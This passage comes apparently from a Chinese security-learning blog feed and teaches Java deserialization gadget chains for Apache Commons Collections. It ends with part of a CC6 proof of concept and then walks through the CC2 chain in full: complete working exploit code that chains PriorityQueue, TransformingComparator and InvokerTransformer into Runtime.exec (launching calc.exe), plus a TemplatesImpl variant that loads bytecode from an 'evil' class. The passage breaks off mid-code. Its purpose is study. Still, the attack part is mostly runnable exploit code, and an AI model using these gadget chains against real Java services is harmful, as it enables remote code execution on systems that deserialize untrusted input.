class_">HashMap</span>();</span><br><span class="line">        map.put(tme,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;adamkey&quot;</span>);</span><br><span class="line">        <span class="comment">//换为真的</span></span><br><span class="line">        setFieldVaule(transformerChain,<span class="string">&quot;iTransformers&quot;</span>,transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = serialize(map);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes1));</span><br><span class="line">        unserialize(bytes1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes); <span class="comment">// 这个是写入，自然是先流进来的。所以它要有参数</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);<span class="comment">//将流进行反序列化的，所以需要流流入，所以他需要一个参数</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();<span class="comment">//输出的，数据流入它，所以它是作为其他流的输入的。它最后是输出用的</span></span><br><span class="line">        <span class="comment">// 这里是用 ByteArrayOutputStram()来盛放。</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);<span class="comment">//ObjectOutputStram(new FileOutputStream)一定要有一个输出兑现，他要把生成的字节给一个东西放着，</span></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldVaule</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没问题哈</p><p><img src="https://bu.dusays.com/2024/06/07/66630a3e4359f.png" alt="image-20240602225711324"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> java </tag>
            
            <tag> 学习 </tag>
            
            <tag> CC链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化--CC2</title>
      <link href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2/"/>
      <url>/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2/</url>
      
        <content type="html"><![CDATA[<h1 id="java反序列化–CC2"><a href="#java反序列化–CC2" class="headerlink" title="java反序列化–CC2"></a>java反序列化–CC2</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>CC2的环境与前面学习的CC1 CC3 CC6环境有一点不一样</p><p>之前我们都是在是<code>Commons-Collections=3.2.1</code>下的攻击</p><p>而这个CC2则是在<code>Commons-Collections=4.0</code>下的攻击</p><p>Apache Commons Collections是⼀个著名的辅助开发库，包含了⼀些Java中没有的数据结构和和辅助 方法，不过随着Java 9以后的版本中原生库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。</p><p>在2015年底commons-collections反序列化利用链被提出时，Apache Commons Collections有以下两个分支版本： </p><ul><li><p>commons-collections:commons-collections </p></li><li><p>org.apache.commons:commons-collections4</p></li></ul><p>可见，groupId和artifactId都变了。前者是Commons Collections老的版本包，当时版本号是<code>3.2.1</code>；后者是官方在2013年推出的4版本，当时版本号是<code>4.0</code>。</p><p>官方认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产生大量不能 向前兼容的改动。所以，commons-collections4不再认为是⼀个用来替换commons-collections的新版本，而是⼀个新的包，两者的命名空间不冲突，因此可以共存在同⼀个项目中</p><p>这也是为什么要分版本的原因</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>需要重新配置maven</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;!-- Apache Commons Collections 4 --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们直接新建一个项目 重新配置maven就行</p><p>按照我们配3.2.1的步骤来就是</p><p>记得要重新加载一下maven</p><p>这里也解决了我们之前CC3的lazyMap的问题</p><h2 id="Commons-Collections-4-0下的思考"><a href="#Commons-Collections-4-0下的思考" class="headerlink" title="Commons-Collections&#x3D;4.0下的思考"></a>Commons-Collections&#x3D;4.0下的思考</h2><p>既然3.2.1中存在反序列化利用链，那么4.0版本是否存在呢</p><p>我们直接尝试CC6能不能在4.0下能不能运行</p><p>先就是一个下马威啊 24个报错</p><p><img src="https://bu.dusays.com/2024/06/07/66630a006bc98.png" alt="image-20240604001722167"></p><p>我们发现导入的包都有问题</p><p>看看怎么个事</p><p>我们对比一下依赖</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line"> &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="line"> &lt;dependency&gt;</span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line"> &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br><span class="line"> &lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commonscollections4 --&gt;</span><br><span class="line"> &lt;dependency&gt;</span><br><span class="line"> &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line"> &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line"> &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>我们可以发现</p><p>老的Gadget中依赖的包名都是 <code>org.apache.commons.collections</code> ，而新的包名已经变了，是 <code>org.apache.commons.collections4</code></p><p>所以</p><p>我们应该将所 有 <code>import org.apache.commons.collections.*</code> 改成 <code>import org.apache.commons.collections4.*</code> </p><p>但是改后还是由一个错误</p><p>报LazyMap.decorate的错误</p><p><img src="https://bu.dusays.com/2024/06/07/66630a012894c.png" alt="image-20240604151122791"></p><p>我们先看看原来CC6里的LazyMap.decorate的定义</p><p><img src="https://bu.dusays.com/2024/06/07/666309ff181c9.png" alt="image-20240604151310700"></p><p>这个报错的原因肯定是在新的依赖里面没有这个类</p><p>而我们应该怎么在<code>Commons-Collections=4.0</code>调用这个decorate呢</p><p>我们直接在新依赖里找有相同功能的类</p><p>以进来就直接看到了</p><p><img src="https://bu.dusays.com/2024/06/07/666309ff6679f.png" alt="image-20240604151703352"></p><p>这不是和我们需要的decorate一模一样吗</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;V, K&gt; LazyMap&lt;K, V&gt; <span class="title function_">lazyMap</span><span class="params">(Map&lt;K, V&gt; map, Transformer&lt;? <span class="built_in">super</span> K, ? extends V&gt; factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以</p><p>我们只要替换一下名字即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, transformerChain);</span><br></pre></td></tr></table></figure><p>这样就行</p><p>没问题了</p><p><img src="https://bu.dusays.com/2024/06/07/66630a00b2ca7.png" alt="image-20240604152112128"></p><p>应该是可以运行了</p><p>没问题</p><p><img src="https://bu.dusays.com/2024/06/07/66630a0281f41.png" alt="image-20240604152156999"></p><p><strong>既然CC6可以在<code>Commons-Collections=4.0</code>下运行</strong></p><p><strong>那么我们之前构造的CC1和CC3肯定也是没问题的</strong></p><p>这里就不多说了</p><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>那么<code>Commons-Collections=4.0</code>有没有新链子吗</p><p>当然</p><p>这就是CC2与CC4</p><p>这里我们先学习CC2</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>先上poc</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="链子构造与分析"><a href="#链子构造与分析" class="headerlink" title="链子构造与分析"></a>链子构造与分析</h3><p>commons-collections这个包之所有能攒出那么多利用链来，除了因为其使用量大，技术上的原因是其 中包含了一些可以<strong>执行任意方法的Transformer</strong>。所以，在commons-collections中找Gadget的过 程，实际上可以简化为，<strong>找一条从 Serializable.readObject() 方法到 Transformer.transform() 方法的调用链</strong>。</p><p>好 现在我们再来看CC2的POC</p><p>CC2里有两个关键类</p><ul><li>java.util.PriorityQueue</li><li>org.apache.commons.collections4.comparators.TransformingComparator</li></ul><p>为什么说这两个类关键呢</p><p><code>java.util.PriorityQueue</code> 是⼀个有自己 <strong>readObject()</strong> 方法的类</p><p><img src="https://bu.dusays.com/2024/06/07/66630a00a8beb.png" alt="image-20240604154010148"></p><p>而<code>org.apache.commons.collections4.comparators.TransformingComparator</code> 中有调 ⽤ <strong>transform()</strong> 方法的函数：</p><p><img src="https://bu.dusays.com/2024/06/07/66630a00d5372.png" alt="image-20240604154228127"></p><p>所以我们就可以知道CC2就是一条从<code>PriorityQueue.readObject()</code> 到 <code>TransformingComparator.comapare.transform()</code> 的利用链</p><p>好 接下来就是把他们给串起来</p><p>我们之前说过 <strong>readObject()是java反序列化的起点</strong></p><p>所以我们从<code>PriorityQueue.readObject()</code>开始 来看看它调用了什么类&#x2F;方法</p><p>首先<code>PriorityQueue.readObject()</code>调用了<code>heapify()</code>方法</p><p><img src="https://bu.dusays.com/2024/06/07/666309ffdb5cd.png" alt="image-20240604155347151"></p><p>点进去</p><p><img src="https://bu.dusays.com/2024/06/07/666309ff6ae88.png" alt="image-20240604155523603"></p><p>发现<code>heapify()</code>调用了<code>siftDown()</code>方法</p><p>点进去</p><p><img src="https://bu.dusays.com/2024/06/07/666309ffe0c98.png" alt="image-20240604155658700"></p><p><code>siftDown()</code>调用链<code>siftDownUsingComparator()</code>方法</p><p>点进去</p><p><img src="https://bu.dusays.com/2024/06/07/66630a002c7f9.png" alt="image-20240604155804822"></p><p>回来了 调用了compare方法</p><p>这样一来链子就通了</p><p>链子还是能简单的</p><p>接下来就可以构造我们的链子了</p><p>首先，还是<strong>创建Transformer</strong>，基作：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br></pre></td></tr></table></figure><p>嗯 你没看错 一模一样的哈</p><p>然后就是创建⼀个 TransformingComparator ，传入我们的Transformer：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br></pre></td></tr></table></figure><p>好 我们实例化 PriorityQueue 对象，第⼀个参数是初始化时的大小，至少需要2个元素才会触发排序和比较， 所以是2；第二个参数是比较时的Comparator，传入前面实例化的comparator：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>后面<strong>随便添加了2个数字进去</strong>，这里可以传入<strong>非null的任意对象</strong>，因为我们的Transformer是忽略传入参 数的</p><p>最后，将真正的恶意Transformer设置上：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br></pre></td></tr></table></figure><p>当然 得有setFieldValue方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">       field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       field.set(obj, value);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>定义了一个名为 <code>setFieldValue</code> 的静态方法，它接受三个参数：一个是目标对象 <code>obj</code>，一个是要修改的字段名 <code>fieldName</code>（字符串类型），最后一个是要设置给该字段的新值 <code>value</code>。这个方法的主要作用是利用 Java 反射 API 动态地修改指定对象中某个字段的值，具体步骤如下：</p><ol><li><strong>获取 Field 对象</strong>：通过 <code>obj.getClass().getDeclaredField(fieldName)</code> 获取目标对象 <code>obj</code> 类中声明的、名为 <code>fieldName</code> 的字段。<code>getDeclaredField</code> 方法可以访问私有字段，但不包括父类的字段。</li><li><strong>开放访问权限</strong>：由于直接访问私有字段通常受到限制，所以使用 <code>field.setAccessible(true)</code> 方法来取消 Java 访问控制检查，允许后续代码修改这个字段的值，即使它原本是 private 的。</li><li><strong>设置字段值</strong>：最后，通过 <code>field.set(obj, value)</code> 实际设置 <code>obj</code> 对象中 <code>fieldName</code> 字段的值为 <code>value</code>。</li></ol><p>然后就是最后的序列化与反序列化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(queue);</span><br><span class="line">oos.close();<span class="comment">//序列化流</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line"><span class="comment">//反序列化</span></span><br></pre></td></tr></table></figure><p>最后就组成了我们的POC啦</p><p><strong>调用流程</strong>：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject-&gt;</span><br><span class="line">PriorityQueue.heapify-&gt;</span><br><span class="line">PriorityQueue.siftDown-&gt;</span><br><span class="line">PriorityQueue.siftDownUsingComparator-&gt;</span><br><span class="line">TransformingComparator.compare-&gt;</span><br><span class="line">ChainedTransformer.transform-&gt;.......</span><br></pre></td></tr></table></figure><h2 id="CC2的进化之路"><a href="#CC2的进化之路" class="headerlink" title="CC2的进化之路"></a>CC2的进化之路</h2><p>在CC3中 我们知道用 TemplatesImpl 可以构造出无Transformer数组的利用</p><p>这里我们也可以用这个来进化一下我们的CC2</p><h3 id="进化失败"><a href="#进化失败" class="headerlink" title="进化失败"></a>进化失败</h3><p>创建 <code>TemplatesImpl</code> 对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getBytescode()&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure><p>创建⼀个人畜无害的 <code>InvokerTransformer</code> 对象，并用它实例化 <code>Comparator</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br></pre></td></tr></table></figure><p>样实例化 <code>PriorityQueue</code> ，但是此时向队列里添加的元素就是我们前面创建的 <code>TemplatesImpl </code>对象了：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(obj);</span><br><span class="line">queue.add(obj)</span><br></pre></td></tr></table></figure><p>因为我们这里无法再使用<code>Transformer</code>数组，所以也就不能用 <code>ConstantTransformer</code> 来初始化变量，需要接受外部传入的变量。而在 <code>Comparator.compare()</code> 时，队列里的元素将作为参数传入<code>transform()</code> 方法，这就是传给 <code>TemplatesImpl.newTransformer</code> 的参数。</p><p>最后⼀步，将 <code>toString</code> 方法改成恶意方法 <code>newTransformer</code> ：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure><p>最后就形成了我们的CC2进化POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytescode() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(evil.EvilTemplatesImpl.class.getName());</span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getBytescode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span 